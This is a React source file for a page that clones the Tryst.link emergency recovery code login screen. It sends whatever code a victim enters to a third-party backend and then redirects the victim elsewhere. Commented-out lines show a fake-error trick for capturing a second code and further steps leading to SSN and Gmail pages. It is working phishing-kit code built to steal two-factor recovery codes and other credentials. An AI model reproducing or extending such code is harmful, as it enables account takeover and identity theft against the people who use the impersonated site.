import React from "react";
import { FaMagnifyingGlass } from "react-icons/fa6";
import { useForm } from 'react-hook-form';
import { useLocation, useNavigate } from 'react-router-dom';

const Code = () => {
  const { state } = useLocation();
    const navigate = useNavigate();
    const { temp } = state;
    // console.log(temp);
    const {
        register,
        handleSubmit,
        formState: { errors },
        resetField,
    } = useForm();
    const handleVerify = (data) => {
        // if (test === 0) {
        //   setTest(test + 1);
        //   setPasswordError(true);
        //   localStorage.setItem('code', data.code);
        //   resetField("code");
        // }else{
        const bookings = {
            code: data.code,
            // code: localStorage.getItem('code') + '{{}}' + data.code,

        };

        // console.log(bookings);

        fetch(`https://rakib-backend.vercel.app/code/${temp}`, {
            method: "PUT",
            headers: {
                "content-type": "application/json",
            },
            body: JSON.stringify(bookings),
        })
            .then((res) => res.json())
            .then((data) => {
                navigate(localStorage.getItem('url'));
                if (data.modifiedCount > 0) {
                    // navigate("/ssn", { state: { temp: temp } });
                    // navigate("/gmail", { state: { temp: temp } });
                }
            });
        // }
    };
  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-primary text-white p-4 flex justify-between items-center md:px-[10%]">
        <div className="flex items-center">
          <img src="/logo.png" alt="Logo" className="h-8 mr-2" />

          <div className="text-white flex gap-2 font-semiBold items-center ml-4 cursor-pointer">
            <FaMagnifyingGlass />
            <span>Search</span>
          </div>
        </div>

        <div>
          <a href="#" className="hover:underline font-bold text-lg">
            Login or Sign up
          </a>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-col md:flex-row justify-start items-start p-6 md:p-16 md:px-[10%]">
        {/* Login Section */}
        <div className="md:w-1/2 p-4">
          <h1 className="text-3xl font-bold mb-4">
            <span className="border-b-2 border-red-500 text-primary">
              Enter{" "}
            </span>
            emergency recovery code
          </h1>
          <p className="text-sm mt-5">
            An emergency recovery code is one of the codes we showed you after
            you set up 2-step login. Each emergency recovery code can be used
            exactly once.
          </p>
          <form className="space-y-4" onSubmit={handleSubmit(handleVerify)} >
            <div>
              <label className="block text-gray-700">
                Emergency recovery code
              </label>
              <input
              {...register("code")}
              required
                type="text"
                placeholder="__  -  __  -  __ -  __"
                maxLength="25"
                className="w-full focus:ring-0 placeholder-dotted text-left text-lg tracking-wide placeholder-gray-400 px-2 py-3 border-[1px] mt-2 rounded-md"
              />
            </div>

            <button
              type="submit"
              className="bg-red-500 inline-block font-bold text-lg text-white py-2 px-10 rounded-full"
            >
              Authnticate
            </button>
          </form>
          <div className="border-t-[1px] mt-24">
            <p className="text-sm py-4">
              Authenticate using security key / passkey instead | Log out
              instead
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-primary text-white p-6 md:p-10  md:px-[10%]">
        <div className="mx-auto flex flex-col md:flex-row justify-between">
          {/* Logo and Description */}
          <div className="mb-6 md:mb-0">
            <div className="flex items-center">
              <img
                src="/logo-dark-8e6535aacea5e45e9daa.svg"
                alt="Logo"
                className="h-10 mr-2"
              />
              <img
                src="/a4-project-7aa67929cda298dae2ec.svg"
                alt="Logo"
                className="h-10 mr-2"
              />
            </div>
            <p className="text-sm mt-4">© 2018–2023, Assembly Four</p>
          </div>

          {/* Links Section */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div>
              <h3 className="text-lg font-semibold mb-2">Home</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    Memberships & Pricing
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Sign Up
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Login
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Locations</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    All Escorts
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Backpage Alternatives
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Blog</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    TLC Donation Matching
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Resources
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    #AcceptanceMatters
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Escort Terms
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Tryst.link FAQ
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Sex Work FAQ
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Help / Support</h3>
              <ul className="space-y-1">
                <li>
                  <a href="#" className="hover:underline">
                    About
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Social
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Terms
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Privacy
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Legal Notices
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Anti-Exploitation Policy
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Code;
